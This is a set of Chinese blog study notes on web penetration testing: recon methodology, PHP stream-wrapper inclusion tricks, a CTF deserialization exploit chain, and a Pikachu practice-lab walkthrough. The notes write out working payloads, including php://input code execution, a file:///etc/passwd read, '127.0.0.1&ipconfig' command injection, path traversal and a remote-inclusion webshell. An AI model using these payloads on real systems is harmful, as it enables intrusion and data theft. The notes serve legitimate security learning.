<h3 id="web应用漏洞发现-具体分析"><a href="#web应用漏洞发现-具体分析" class="headerlink" title="web应用漏洞发现|具体分析"></a>web应用漏洞发现|具体分析</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">开发框架类源码渗透测试报告-资讯-thinkphp,spring:16:40</a><br>1、故意输错网址看报错信息有概率可以爆出开发的框架信息。<br>2、主要就是用扫描工具扫,看有没有爆出开发框架类型甚至其漏洞也爆出来,随后利用网络搜索搜这个漏洞。&#96;<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">已知 CMS 非框架类渗透测试报告-工具脚本-wordpress:35:00</a><br>1、识别cms:人工抓包;网站;工具(wpscan–检测wordpress这种cms:kali自带)。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde"> 已知 CMS 非框架类渗透测试报告-代码审计-qqyewu_php:50:00</a><br>1、这种一般是小公司自己开发一套网站源码自己用,所以上网搜索搜不到,代码框架也分析不出来是哪套,cms已知但由于过于小众网上搜不到漏洞,但是我们有源码,可以自己代码审计。<br>2、不得已情况下使用,看源码的时间很长,考验代码功底以及经验。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde"> 未知 CMS 非框架类渗透测试报告-人工-你我都爱的 wg 哦~(实际案例):1:04:00</a><br>1、听思路，很重要。(最后这20分钟可以复刷)<br>2、robots.txt-&gt;上网搜-&gt;尝试登陆后台-&gt;扫端口-&gt;测试有无源码备份文件(目录扫描)–找数据库备份文件,后面看可不可以根据配置信息里面的账号密码可不可以连接数据库。<br>学习资源:<a href="https://blog.csdn.net/qq_53079406/article/details/124475440(%E8%BE%83%E5%85%A8)">https://blog.csdn.net/qq_53079406/article/details/124475440(较全)</a></p>
<h2 id="APP-大纲"><a href="#APP-大纲" class="headerlink" title="APP|大纲"></a>APP|大纲</h2><p><img src="https://pic.imgdb.cn/item/65436148c458853aef686897.png" alt="图三" title="对于如何发现APP漏洞的大纲"></p>
<h3 id="APP-具体分析"><a href="#APP-具体分析" class="headerlink" title="APP|具体分析"></a>APP|具体分析</h3><p><img src="https://pic.imgdb.cn/item/654361abc458853aef698547.jpg" alt="图四" title="对于如何发现APP漏洞的思路"><br>1、建议反编译(逆向)以及抓包都进行,避免前期因为信息收集不够全面或者其他问题而导致的遗漏<br>2、如果app不使用web协议开发,采用网络接口抓包方法–wireshark(非web)<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">抓包工具web协议面使用说明:8:20</a><br>1、get一个知识点:在网址栏后面加入一个’：如果报错猜测有注入点;如果还是原来网站页面,猜测不存在注入<br>2、Charles,推荐这个工具抓app的数据包(但是仅仅只可以看,不可以重发这个数据包)<br>3、手机端的数据包为什么电脑访问不了? 这个包只可以手机访问–由于内核不同,存在检测<br>4、利用kali自带的xray:实现访问手机网站时,浏览器访问不了,但是要对它进行扫描的操作<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">抓包工具非web协议面使用说明–wireshark:49:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">安卓逆向便捷APK一键提取URL演示(反编译):54:50</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">利用Burp筛选以及联动功能打出军体拳(Burp+xray):1:00:37</a><br><code>联动的目的是为了被动扫描和手工测试漏洞同时进行</code><br>自己学习:<a href="https://blog.csdn.net/weixin_46318141/article/details/121239422">https://blog.csdn.net/weixin_46318141/article/details/121239422</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">模拟器四个违法案例app安全分析测试:1:10:37</a><br><code>其实app类型的也是web,是web上面多了一层包装而已,app类型撕开包装也是web</code></p>
<h2 id="API接口-端口服务-大纲"><a href="#API接口-端口服务-大纲" class="headerlink" title="API接口|端口服务|大纲"></a>API接口|端口服务|大纲</h2><p><img src="https://pic.imgdb.cn/item/65449afbc458853aefa7c733.png" alt="图五" title="对于如何发现API接口|端口服务漏洞的大纲"><br><code>信息收集之信息利用|进阶拓展</code><br>第一步：首先识别网站是否有cdn，waf等产品，有则绕过。<br>第二步：扫描收集到网站的端口信息，真实ip地址，ip绑定的其他域名。<br>第三步：网站敏感路径扫描<br>第四步：域名+端口敏感信息扫描<br>第五步：ip+端口敏感目录扫描<br>备注：字典不应该只是敏感路径，还应该有备份文件 zip rar tar tar.gz等格式文件</p>
<p><code>端口服务类安全测试</code><br>根据前期信息收集针对目标端口服务类探针后进行的安全测试，主要涉及攻击方法：口令安全，WEB<br>类漏洞，版本漏洞等，其中产生的危害可大可小。属于端口服务&#x2F;第三方服务类安全测试面。一般在<br>已知应用无思路的情况下选用的安全测试方案。</p>
<p><code>API接口类安全测试</code><br>根据应用自身的功能方向决定，安全测试目标需有 API 接口调用才能进行此类测试，主要涉及的安<br>全问题：自身安全，配合 WEB，业务逻辑等，其中产生的危害可大可小，属于应用 API 接口网络服<br>务测试面，一般也是在存在接口调用的情况下的测试方案。<br>WSDL（网络服务描述语言，Web Services Description Language）是一门基于 XML 的语言，用于描述<br>Web Services 以及如何对它们进行访问(网络接口的数据传输语言)。<br>参考学习:<a href="https://xz.aliyun.com/t/2412">https://xz.aliyun.com/t/2412</a><br><code>发现网站的API接口漏洞关键字</code><br>配合 shodan，fofa,zoomeye 搜索也不错哦~<br>inurl:jws?wsdl<br>inurl:asmx?wsdl<br>inurl:aspx?wsdl<br>inurl:ascx?wsdl<br>inurl:ashx?wsdl<br>inurl:dll?wsdl<br>inurl:exe?wsdl<br>inurl:php?wsdl<br>inurl:pl?wsdl<br>inurl:?wsdl<br>filetype:wsdl wsdl<br><img src="https://pic.imgdb.cn/item/65449b58c458853aefa8d097.png" alt="图六" title="常见漏洞"></p>
<h3 id="API接口-端口服务-具体分析"><a href="#API接口-端口服务-具体分析" class="headerlink" title="API接口|端口服务|具体分析"></a>API接口|端口服务|具体分析</h3><h4 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h4><p><code>1、有时候打开一个网站带上其接口,但是打开网站后接口会被屏蔽;若接口没有屏蔽,可尝试手动去掉接口,可能看到到另一套程序。</code><br><code>2、查同一网站所有者不同域名思路(仅后缀不同):直接上域名注册的网站搜,看有哪个域名被注册了。(随后分别进行子域名收集)</code><br><code>3、不仅要域名扫描、ip扫描:还要端口扫描、目录扫描(敏感文件扫描、dirsearch工具)</code><br><code>4、端口扫描:MASSCAN、nmap、goby、Nessus</code>–扫主机,范围更广。</p>
<h4 id="Web-Services–API接口-P45-1-10-00"><a href="#Web-Services–API接口-P45-1-10-00" class="headerlink" title="Web Services–API接口(P45:1:10:00)"></a>Web Services–API接口(P45:1:10:00)</h4><p><code>5、接下来就接口层,漏扫工具:Acunetix(AWVS)</code>–专门扫web具体漏洞如(SQL)。自动化的 Web 应用程序安全测试工具，是通过检查 SQL 注入，跨站点脚本（XSS）和其他可利用漏洞等来审核 Web 应用程序。一般来说，Acunetix 能够扫描任何通过网络浏览器访问并使用 HTTP&#x2F;HTTPS 协议的网站或 web 应用程序。<br>使用:<a href="https://blog.csdn.net/weixin_45723896/article/details/131409802">https://blog.csdn.net/weixin_45723896/article/details/131409802</a><br><code>墙裂安利</code><br>awvs+xray+Nessus联动扫描:<a href="https://blog.csdn.net/weixin_44369049/article/details/131205774">https://blog.csdn.net/weixin_44369049/article/details/131205774</a></p>
]]></content>
      <categories>
        <category>漏洞探测发现</category>
      </categories>
      <tags>
        <tag>漏洞探测发现</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2023/12/13/phpWeiXieYi/</url>
    <content><![CDATA[<p>目前常用：<br>1、php:&#x2F;&#x2F;input<br>存在文件包含：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>那么可以</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="regexp">//i</span>nput</span><br></pre></td></tr></table></figure>
<p>然后post传递要执行的php代码，如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>文件包含配合伪协议实现任意代码|命令执行。<br>2、php:&#x2F;&#x2F;filter<br>读取文件，当存在文件包含时<br>比如</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$file</span>=key.php;</span></span><br><span class="line">include(<span class="symbol">$</span><span class="keyword">file</span>);</span><br></pre></td></tr></table></figure>
<p>就可以</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=key.php</span><br></pre></td></tr></table></figure>
<p>进行读取这个包含的文件。<br>3、file:&#x2F;&#x2F;<br>访问本地文件系统</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?filename=file:<span class="regexp">//</span><span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>php伪协议</category>
      </categories>
      <tags>
        <tag>php伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>多类情况下的PHP反序列化</title>
    <url>/2023/11/11/phpMoreclass/</url>
    <content><![CDATA[<p>感谢群友，让我学习到了新知识点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>这道题的解法就是反序列化+代码执行或反序列化+命令执行</code><br>首先代码审计</p>
<h3 id="syc类"><a href="#syc类" class="headerlink" title="syc类"></a>syc类</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">class syc<span class="regexp">//</span>类syc</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$cuit</span>;<span class="regexp">//</span>属性</span><br><span class="line">    public <span class="keyword">function</span> __destruct()<span class="regexp">//</span>魔术方法，销毁对象时触发</span><br><span class="line">    &#123;</span><br><span class="line">        echo(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable">$this</span>-&gt;cuit;<span class="regexp">//</span>属性cuit的值赋给<span class="keyword">function</span></span><br><span class="line">        return <span class="variable">$function</span>();<span class="regexp">//</span>调用<span class="variable">$function</span>所引用的函数（或方法）并返回其结果。当接收的是lover的对象后便会自动调用invoke方法。</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="lover类"><a href="#lover类" class="headerlink" title="lover类"></a>lover类</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;<span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;<span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)//魔术方法，当此类(<span class="params">lover</span>)的对象作为方法被调用时自动调用。</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;<span class="comment">//返回当前对象yxx属性的QW属性(这里我疑惑:yxx属性哪里存在QW属性？后面才知道，这里的真是作用)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="web类"><a href="#web类" class="headerlink" title="web类"></a>web类</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">class web</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$eva1</span>;<span class="regexp">//</span>属性</span><br><span class="line">    public <span class="variable">$interesting</span>;<span class="regexp">//</span>属性</span><br><span class="line">    public <span class="keyword">function</span> __get(<span class="variable">$var</span>)<span class="regexp">//</span>魔术方法，当访问不可访问属性时自动调用。</span><br><span class="line">    &#123;</span><br><span class="line">        echo(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable">$this</span>-&gt;interesting);<span class="regexp">//</span>若<span class="variable">$eval</span>=eval;interesting=<span class="string">&#x27;phpinfo&#x27;</span>,那么就是eval(<span class="string">&#x27;phpinfo()&#x27;</span>)。这不就是代码执行吗，关键获取flag的点就在这里</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="综合分析"><a href="#综合分析" class="headerlink" title="综合分析"></a>综合分析</h3><p>综上代码审计，我们可以先写出生成payload的代码，接着我会从这段代码分析为什么要这样。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>=<span class="string">&#x27;eval&#x27;</span>;<span class="comment">//代码执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>=<span class="string">&#x27;phpinfo()&#x27;</span>;<span class="comment">//想要执行的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$syc1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">syc</span>();<span class="comment">//创建一个syc类的对象</span></span><br><span class="line"><span class="variable">$lover1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();<span class="comment">//创建一个lover类的对象</span></span><br><span class="line"><span class="variable">$web1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();<span class="comment">//创建一个web类的对象</span></span><br><span class="line"><span class="variable">$lover1</span>-&gt;yxx=<span class="variable">$web1</span>;<span class="comment">//关键点：将web类的对象赋值给lover类的对象的属性（其实也就是传给对象）</span></span><br><span class="line"><span class="variable">$lover1</span>-&gt;QW=<span class="variable">$web1</span>;<span class="comment">//这里不用赋值应该也行</span></span><br><span class="line"><span class="variable">$syc1</span>-&gt;cuit=<span class="variable">$lover1</span>;<span class="comment">//将lover类的对象赋值给syc类的对象的属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$syc1</span>);<span class="comment">//赋完值后，将这串要传送的数据序列化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>注释（解释一个刚开始不懂的地方）</code></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="variable">$lover1</span>-&gt;<span class="attribute">yxx</span>=<span class="variable">$web1</span>;</span><br></pre></td></tr></table></figure>
<p>这里是为了触发web类的魔术方法get(),因为这样子赋值后,原来lover类的 return $this-&gt;yxx-&gt;QW;就会返回$web的QW属性，但此时不存在QW属性，便会自动调用get，我们便可以代码执行&#x2F;命令执行实现getshell。</p>
]]></content>
      <categories>
        <category>道听途说随笔记</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu通关回放</title>
    <url>/2023/10/14/pikachuAccess/</url>
    <content><![CDATA[<p>本来不打算做的,因为时间紧任务重,但心血来潮,想整这么玩意,献丑了。<br>参考文献:<a href="https://blog.csdn.net/weixin_52385170/article/details/128093840">https://blog.csdn.net/weixin_52385170/article/details/128093840</a></p>
<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>不多说,随便输入一个用户名与密码,直接抓包发送到inturder,设置好爆破即可。<br>只有一个注意点,你要爆几个字段,那么你就要导入多少个字典。<br><img src="https://pic.imgdb.cn/item/653b2573c458853aef70fc14.jpg" alt="图一" title="字典一"><br><img src="https://pic.imgdb.cn/item/653b25ebc458853aef72495a.jpg" alt="图一" title="字典二"><br>之后就开始爆破。<br>观察到有一个数据包的长度明显不同于其他,那么这一对可能匹配。<br><img src="https://pic.imgdb.cn/item/653b2634c458853aef731015.jpg" alt="图一" title="发现异常数据包"><br>成功<br><img src="https://pic.imgdb.cn/item/653b2649c458853aef734c72.jpg" alt="图一" title="成功"></p>
<h3 id="验证码绕过-验证在客户端"><a href="#验证码绕过-验证在客户端" class="headerlink" title="验证码绕过(验证在客户端)"></a>验证码绕过(验证在客户端)</h3><p>直接浏览器禁用js或者验证码复用(把第一次的验证码固定)即可,其他均与上述一致。<br><img src="https://pic.imgdb.cn/item/653b2654c458853aef7366c1.jpg" alt="图一" title="验证码不要动"></p>
<h3 id="验证码绕过-验证在服务器端"><a href="#验证码绕过-验证在服务器端" class="headerlink" title="验证码绕过(验证在服务器端)"></a>验证码绕过(验证在服务器端)</h3><p>这里是发现验证码没有时间限制,也就是可以复用。<br>tips:如何判断验证码是在前端验证还是在后端验证:直接输入一个错误的验证码,看他是否弹窗(弹窗一般是js)但也不全面<br>最有效的是查看源码,后端验证的话验证代码源码看不到；但是前端的话可以看到。</p>
<h3 id="带token"><a href="#带token" class="headerlink" title="带token"></a>带token</h3><p>参考:<a href="https://blog.csdn.net/m0_74977101/article/details/131833702">https://blog.csdn.net/m0_74977101/article/details/131833702</a><br>具体操作看上篇文章,这里只讲一下思路。<br>输入完成后抓包,发现带有token,先尝试token可不可以复用,发现token是每请求一次就自动刷新的。<br>继续观察,发现当前token来源于上一个返回的数据包。</p>
<h2 id="Cross-Site-Scripting–XSS"><a href="#Cross-Site-Scripting–XSS" class="headerlink" title="Cross-Site Scripting–XSS"></a>Cross-Site Scripting–XSS</h2><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="get型"><a href="#get型" class="headerlink" title="get型"></a>get型</h3><p>登录后点击可以看到个人信息<br>修改个人信息后抓包<br><img src="https://pic.imgdb.cn/item/652a943cc458853aeff78003.png" alt="图一" title="原始数据包"><br>若某种机缘巧合下,截取到修改信息的数据包,那把数据改成自己想要的,然后伪装成人畜无害的样子发给用户,诱使用户点击,点击后就会触发csrf跨站伪造请求漏洞,数据成功被修改。<br><img src="https://pic.imgdb.cn/item/652a9440c458853aeff7997e.png" alt="图二" title="成功请求"></p>
<h3 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h3><p>与get方式不同,可以通过抓包。参考上面那篇文章。<br>就是通过抓包得到的数据,构造一个html表单存储数据(存储在www目录下),然后点击submit即可完成修改。</p>
<h3 id="token验证型"><a href="#token验证型" class="headerlink" title="token验证型"></a>token验证型</h3><p>CSRF的主要问题是敏感操作的链接容易被伪造，那么如何让这个链接不容易被伪造？<br>Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌。<br>当我们点击修改个人信息的时候，从url可以看出我们访问了token_get_edit.php，执行后端代码，生成token，并且发送到前端页面，通过hidden属性隐藏起来，放在表单中,用来指定这个数据包(后端也存在这个token)。<br>当完成填入要修改的内容信息后,此时点击submit,此时表单内容以及token一起发送到后端进行验证,若token相同,则允许修改,反之拒绝。(因为如果要伪造一个数据包,由于token是随机生成的,如果刷新界面,那么就会生成一个新的token,token必定会不同,这样可以有效防止CSRF跨站伪造请求)。</p>
<h3 id="little对比"><a href="#little对比" class="headerlink" title="little对比"></a>little对比</h3><p>1、CSRF在一些情况下可以使用的,若对面没有开启token验证,则我们可以通过截取的数据包构造出我们想要的另一个数据包,访问即可达到效果。<br>2、XSS需要一定的社工,即诱使对方点击某一个带木马的链接才可以达到效果。</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>首先ping 127.0.0.1<br><img src="https://pic.imgdb.cn/item/652bea79c458853aef4426ea.png" alt="图三" title="成功请求"><br>成功<br>但是直接执行ipconfig的话<br><img src="https://pic.imgdb.cn/item/652bea88c458853aef445dc6.png" alt="图四" title="失败请求"><br>失败<br>这是由于他是ping命令,若直接填入ipconfig,相当于ping ipconfig,肯定报错<br>这里要用到windows可以利用&amp;符号来执行多条语句的方法,填入</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>&amp;ipconfig</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/652bea92c458853aef447f38.png" alt="图五" title="成功请求"><br>成功</p>
<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>顾名思义,就是直接接受你输入的php代码直接执行,究其本质是因为php代码中存在一个eval()函数,他会把你输入到括号内的语句当作php代码去执行。<br>直接输入phpinfo();<br><img src="https://pic.imgdb.cn/item/652beb59c458853aef4706f2.png" alt="图六" title="成功请求"></p>
<h3 id="little-总结"><a href="#little-总结" class="headerlink" title="little 总结"></a>little 总结</h3><p>1、RCE总体上还是可以建议测试的,因为总会有一些函数是不得不开放的,若一个网站存在这些可以执行命令或解析代码的函数,则可以利用这些函数测试。</p>
<h2 id="File-Inclusion-文件包含漏洞"><a href="#File-Inclusion-文件包含漏洞" class="headerlink" title="File Inclusion(文件包含漏洞)"></a>File Inclusion(文件包含漏洞)</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>任意选一个提交,查看网址,发现包含的是一个.php文件,由于时&#x3D;是个人电脑,我在某一个目录下创建了一个1.php文件,内容是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我把filename值改成</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">..<span class="regexp">/../</span>..<span class="regexp">/../</span><span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
<p>成功包含了此文件,并被网页成功解析</p>
<p><img src="https://pic.imgdb.cn/item/652cf44ec458853aef499f88.png" alt="图七" title="成功请求"></p>
<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>前提:见参考文献<br>在远程包含漏洞中，攻击者可以通过访问外部地址来加载远程代码。在这个远程文件写入一句话木马，危害极大。<br>这里我们利用pikachu提供的一句话木马文件,存在于pikachu的test目录下的yijuhua.txt。<br>这个木马的大概作用是向当前位置创建并打开一个.php文件,并向其写入一句话木马。这个一句话木马相当于远程命令执行。<br><img src="https://pic.imgdb.cn/item/652cf7d3c458853aef530022.png" alt="图八" title="访问目标文件地址"><br>访问这个网址,不出意外的话,会在当前目录fileinclude创建一个含有一句话木马的yijuhua.php文件<br>但是我这里出了点小插曲,安全软件拦截了,问题不大,恢复出去即可。<br><img src="https://pic.imgdb.cn/item/652cf7d7c458853aef5309a5.png" alt="图九" title="成功创建"><br>然后我们就可以以此作为跳板,进行远程命令执行。<br><img src="https://pic.imgdb.cn/item/652cf8e9c458853aef55e3ac.png" alt="图十" title="成功操作"></p>
<h3 id="little-总结-1"><a href="#little-总结-1" class="headerlink" title="little 总结"></a>little 总结</h3><p>1、文件包含漏洞不需要知道目标网站的具体目录结构,因为他是在当前的文件夹包含入一个文件的。<br>2、远程包含漏洞带来的危害更大,从上述案例可以看出,利用远程包含漏洞可以把我们希望在对面执行的结果写入一个文件(比如创建一句话木马的文件),如果成功包含,即可getshell。</p>
<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>在这里,看网址只是显示一个总体的index主页文件,看不出什么所以然。<br>但是当我把鼠标移到图片处时,观察到网址包含filename属性。<br><img src="https://pic.imgdb.cn/item/652fcfa6c458853aef84ee0c.png" alt="图十一" title="图十一"><br>把网址复制出来观察,点到不同的图片变化的只是filename值,说明他是在当前目录下下载文件。<br>实际中,可以通过对网站的扫描可以知道该网站目录下有哪些文件,然后再跳转到那个目录下,可以完成未授权的下载。<br>我的www目录下有一个1.php文件,那么我可以通过以下方法下载到它。<br><img src="https://pic.imgdb.cn/item/652fcfb6c458853aef852e0b.png" alt="图十二" title="图十二"><br>这便是简单的文件下载。(..&#x2F;是向上级目录跳转的意思)</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="client-check-前端验证"><a href="#client-check-前端验证" class="headerlink" title="client check(前端验证)"></a>client check(前端验证)</h3><p>记住,所有在前端进行验证的都不是靠谱的,如果网站是设计在前端进行验证的,首先考虑先把js给禁用掉。<br>这里首先直接上传一个.php文件,发现我还没点提交,他就直接提示报错信息,说明是一个前端验证。<br><img src="https://pic.imgdb.cn/item/652fd3adc458853aef928935.png" alt="图十三" title="图十三"><br>这里直接成功了,可以上传.php文件。</p>
<h3 id="MIME信息验证"><a href="#MIME信息验证" class="headerlink" title="MIME信息验证"></a>MIME信息验证</h3><p>直接在burpsuite抓包,把Content-Type信息改成图片形式的即可,我这里是png<br><img src="https://pic.imgdb.cn/item/652fd5a0c458853aef995514.png" alt="图十四" title="图十四"></p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">image/png</span><br><span class="line">image/jpg</span><br></pre></td></tr></table></figure>
